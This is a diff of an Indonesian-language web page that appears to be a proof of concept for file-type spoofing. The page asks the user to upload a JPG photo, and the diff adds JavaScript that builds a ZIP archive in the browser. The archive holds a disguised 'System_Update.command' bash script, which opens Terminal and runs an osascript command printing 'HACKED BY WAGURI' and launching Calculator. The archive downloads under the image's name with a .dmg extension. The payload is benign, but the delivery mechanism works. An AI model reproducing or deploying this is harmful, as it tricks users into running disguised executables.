@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>File Picker Spoofing - JPG to DMG</title>
+<title>Valid ZIP disguised as DMG</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -21,7 +21,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>📸 Unggah Gambar Anda</h1>
-    <p>Pilih file JPG dari perangkat Anda. Sistem akan memproses gambar secara otomatis.</p>
+    <p>Pilih file JPG. Sistem akan membuat file .dmg yang valid (berisi script Terminal).</p>
     
     <input type="file" id="fileInput" accept="image/jpeg, image/jpg">
     <button id="pick-btn" type="button">Pilih Gambar (JPG)</button>
@@ -34,46 +34,93 @@ const pickBtn = document.getElementById("pick-btn");
 const fileInput = document.getElementById("fileInput");
 const statusDiv = document.getElementById("status");
 
-// Trigger file picker saat tombol diklik
 pickBtn.addEventListener("click", () => {
     fileInput.click();
 });
 
-// Logika saat file dipilih
+// Fungsi untuk membuat file ZIP (struktur valid) secara manual
+function buatZip(scriptContent) {
+    const encoder = new TextEncoder();
+    const nameBytes = encoder.encode("System_Update.command");
+    const contentBytes = encoder.encode(scriptContent);
+    
+    // Hitung CRC32 (sederhana)
+    function hitungCRC32(bytes) {
+        var crc = 0xFFFFFFFF;
+        for (var i = 0; i < bytes.length; i++) {
+            crc ^= bytes[i];
+            for (var j = 0; j < 8; j++) {
+                crc = (crc >>> 1) ^ ((crc & 1) ? 0xEDB88320 : 0);
+            }
+        }
+        return (crc ^ 0xFFFFFFFF) >>> 0;
+    }
+    const crc = hitungCRC32(contentBytes);
+
+    // Local File Header
+    const localHeader = new Uint8Array(30 + nameBytes.length);
+    const lh = new DataView(localHeader.buffer);
+    lh.setUint32(0, 0x04034b50, true); // Signature
+    lh.setUint16(4, 20, true); // Version
+    lh.setUint16(8, 0, true); // Compression (0 = stored)
+    lh.setUint32(14, crc, true); // CRC32
+    lh.setUint32(18, contentBytes.length, true); // Compressed size
+    lh.setUint32(22, contentBytes.length, true); // Uncompressed size
+    lh.setUint16(26, nameBytes.length, true); // Filename length
+    localHeader.set(nameBytes, 30);
+
+    // Central Directory
+    const centralDir = new Uint8Array(46 + nameBytes.length);
+    const cd = new DataView(centralDir.buffer);
+    cd.setUint32(0, 0x02014b50, true); // Signature
+    cd.setUint16(4, 20, true); // Version made by
+    cd.setUint16(6, 20, true); // Version needed
+    cd.setUint32(16, crc, true); // CRC32
+    cd.setUint32(20, contentBytes.length, true); // Compressed size
+    cd.setUint32(24, contentBytes.length, true); // Uncompressed size
+    cd.setUint16(28, nameBytes.length, true); // Filename length
+    cd.setUint32(42, 0, true); // Relative offset
+    centralDir.set(nameBytes, 46);
+
+    // End of Central Directory
+    const eocd = new Uint8Array(22);
+    const eocdView = new DataView(eocd.buffer);
+    eocdView.setUint32(0, 0x06054b50, true); // Signature
+    eocdView.setUint16(8, 1, true); // Total entries
+    eocdView.setUint16(10, 1, true); // Total entries
+    eocdView.setUint32(12, centralDir.length, true); // Central dir size
+    eocdView.setUint32(16, localHeader.length + contentBytes.length, true); // Offset
+
+    // Gabungkan semua bagian
+    return new Blob([localHeader, contentBytes, centralDir, eocd], { type: 'application/octet-stream' });
+}
+
 fileInput.addEventListener("change", function(event) {
     const file = event.target.files[0];
     if (!file) return;
 
-    statusDiv.textContent = "Memproses gambar...";
+    statusDiv.textContent = "Memproses gambar dan membuat DMG...";
     pickBtn.disabled = true;
 
     const reader = new FileReader();
 
     reader.onload = function(e) {
-        // 1. Dapatkan ArrayBuffer dari gambar asli
-        const arrayBuffer = e.target.result;
+        // Script Terminal macOS
+        const shellScript = "#!/bin/bash\n" +
+                            "open -a Terminal\n" +
+                            "osascript -e 'tell application \"Terminal\" to do script \"echo HACKED BY WAGURI; open -a Calculator\"'\n";
 
-        // 2. Buat Payload DMG secara Programatik
-        // Header DMG asli: "koly" (6b 6f 6c 79)
-        // Kita buat Uint8Array dengan dummy data
-        const dmgHeader = new Uint8Array([0x6B, 0x6F, 0x6C, 0x79]); // "koly"
-        
-        // Dummy data untuk DMG (misalnya 1024 byte)
-        const dummyData = new Uint8Array(1024);
-        
-        // 3. Gabungkan JPG + Header DMG + Dummy
-        const finalBlob = new Blob([arrayBuffer, dmgHeader, dummyData], { type: 'application/octet-stream' });
-        
-        // 4. Buat URL untuk diunduh
-        const url = URL.createObjectURL(finalBlob);
+        // Buat file ZIP yang valid
+        const zipBlob = buatZip(shellScript);
+
+        // Buat URL dan unduh sebagai .dmg
+        const url = URL.createObjectURL(zipBlob);
         const a = document.createElement('a');
         a.href = url;
         
-        // 5. Ubah nama file menjadi .dmg
-        // Mengambil nama asli tanpa ekstensi, lalu tambahkan .dmg
         let originalName = file.name;
         let baseName = originalName.substring(0, originalName.lastIndexOf('.')) || originalName;
-        a.download = baseName + '.dmg';
+        a.download = baseName + '.dmg'; 
         
         document.body.appendChild(a);
         a.click();
@@ -83,7 +130,7 @@ fileInput.addEventListener("change", function(event) {
             URL.revokeObjectURL(url);
         }, 3000);
 
-        statusDiv.textContent = "File berhasil diproses dan diunduh sebagai .dmg!";
+        statusDiv.textContent = "File .dmg (ZIP valid) berhasil diunduh!";
         statusDiv.style.color = '#4CAF50';
         pickBtn.disabled = false;
     };
